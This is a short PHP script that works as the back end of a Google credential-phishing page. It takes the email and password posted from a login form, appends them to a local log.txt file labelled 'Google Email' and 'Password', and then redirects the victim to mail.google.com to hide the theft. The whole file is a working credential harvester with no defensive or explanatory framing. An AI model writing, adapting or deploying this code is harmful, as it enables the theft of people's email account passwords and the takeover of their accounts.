<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];

    $data = "Google Email: " . $email . "\nPassword: " . $pass . "\n\n";
    
    file_put_contents("log.txt", $data, FILE_APPEND);
    
    header("Location: https://mail.google.com");
    exit();
}
?>
